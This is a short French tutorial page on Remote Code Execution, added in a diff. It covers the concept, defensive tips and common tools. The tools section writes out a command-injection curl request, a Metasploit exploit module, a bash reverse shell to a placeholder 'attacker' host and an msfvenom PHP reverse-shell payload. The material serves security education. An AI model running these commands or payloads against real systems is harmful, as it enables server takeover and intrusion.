@@ -1,0 +1,61 @@
+---
+title: Remote Code Execution
+date: '2025-07-15'
+draft: false
+---
+
+# 💻 Remote Code Execution (RCE)
+
+## Qu'est-ce que la Remote Code Execution ?
+
+La Remote Code Execution (RCE) permet d'exécuter du code arbitraire à distance sur un serveur ou une machine cible, souvent via une faille logicielle.
+
+## 🎯 Objectifs pédagogiques
+
+- Comprendre le concept de RCE
+- Savoir identifier et exploiter une faille RCE
+
+## 📋 Exemples de scénarios et commandes
+
+- Exploiter une injection de commande pour obtenir un shell
+- Utiliser un payload pour exécuter du code à distance
+- Prendre le contrôle d'un serveur via une faille RCE
+
+## 🛡️ Bonnes pratiques
+
+- Mettre à jour régulièrement les logiciels
+- Restreindre les droits d'exécution
+- Surveiller les logs d'exécution de commandes
+
+## 📚 Ressources utiles
+
+- [OWASP - RCE](https://owasp.org/www-community/attacks/Remote_Code_Execution)
+- [HackTricks - RCE](https://book.hacktricks.xyz/pentesting-web/rce)
+
+## 🛠️ Outils et commandes les plus utilisés
+
+- **curl** : Tester l'injection de commandes
+  ```bash
+  curl -X POST -d 'cmd=whoami' http://site-vulnerable/exec.php
+  ```
+- **Burp Suite** : Automatiser et manipuler les requêtes
+- **Metasploit** : Exploiter automatiquement des failles RCE
+  ```bash
+  msfconsole
+  use exploit/multi/http/php_cgi_arg_injection
+  set RHOSTS site-vulnerable
+  run
+  ```
+- **ncat / socat** : Reverse shell
+  ```bash
+  ncat -lvnp 4444
+  bash -i >& /dev/tcp/attacker/4444 0>&1
+  ```
+- **msfvenom** : Générer des payloads personnalisés
+  ```bash
+  msfvenom -p php/reverse_php LHOST=attacker LPORT=4444 -f raw > shell.php
+  ```
+
+---
+
+_Dernière mise à jour : 15 juillet 2025_ 
